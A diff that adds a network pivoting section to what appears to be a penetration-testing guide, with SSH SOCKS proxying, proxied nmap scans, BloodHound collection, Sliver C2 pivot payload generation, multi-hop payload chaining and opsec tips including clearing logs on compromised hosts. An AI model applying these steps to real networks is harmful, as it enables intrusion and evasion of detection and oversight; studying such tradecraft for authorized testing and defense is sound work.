@@ -498,3 +498,72 @@ amass viz -d example.com -o network_graph.gexf
 - **Patience**: Quality reconnaissance takes time
 - **Opportunity Spotting**: Look for "open windows" in defenses during mapping
 
+## 7. Network Pivoting Fundamentals
+
+### Basic SSH Pivoting
+```bash
+# Establish SOCKS proxy via SSH
+ssh -D 8080 user@pivot_host
+
+# If connection fails:
+1. Edit /etc/ssh/sshd_config on target
+2. Restart SSH service:
+   systemctl restart sshd
+```
+
+### Practical Pivoting Setup
+1. **RDP + SSH Forwarding**  
+   - Forward SSH through RDP to VPS  
+   - Configure Firefox to use SOCKS5 proxy (localhost:1080)
+
+2. **Internal Network Scanning**  
+   - Discover hosts via pivoted connection  
+   - Service enumeration:  
+     ```bash
+     nmap -sT -p 80,443 --proxy socks5://localhost:1080 192.168.1.100
+     ```
+   - Banner grabbing for service identification
+
+### Active Directory Environments
+**BloodHound Setup:**
+1. Install on attack machine
+2. Collect data via SharpHound on Windows or Linux equivalent
+3. Analyze attack paths and privilege escalation opportunities
+
+### Sliver C2 Pivoting
+```bash
+# Set up listener
+sliver > listener mtls --host 192.168.1.10
+
+# Generate pivot payload
+sliver > generate --mtls 192.168.1.10 --os windows --arch x64 --pivot
+
+# Establish proxy tunnel
+sliver > socks start
+```
+
+**Browser Configuration (Firefox):**
+1. Preferences → Network Settings → Manual Proxy
+2. SOCKS Host: `localhost`
+3. Port: `1080`
+4. Version: SOCKS5
+
+### Advanced Techniques
+1. **Multi-Host Pivoting**  
+   ```bash
+   # Scan additional segments
+   nmap -Pn 192.168.1.0/24
+   ```
+2. **Payload Chaining**  
+   - Generate internal payloads via existing pivot  
+   - Stage attacks through multiple jump hosts  
+
+3. **Segmented Network Access**  
+   - Chain proxies through multiple compromised hosts  
+   - Route traffic through nested segments  
+
+### Operational Security
+- Rotate pivot points regularly  
+- Use encrypted tunnels (SSH/SOCKS5)  
+- Limit scan intensity to avoid detection  
+- Clear logs on pivot hosts  
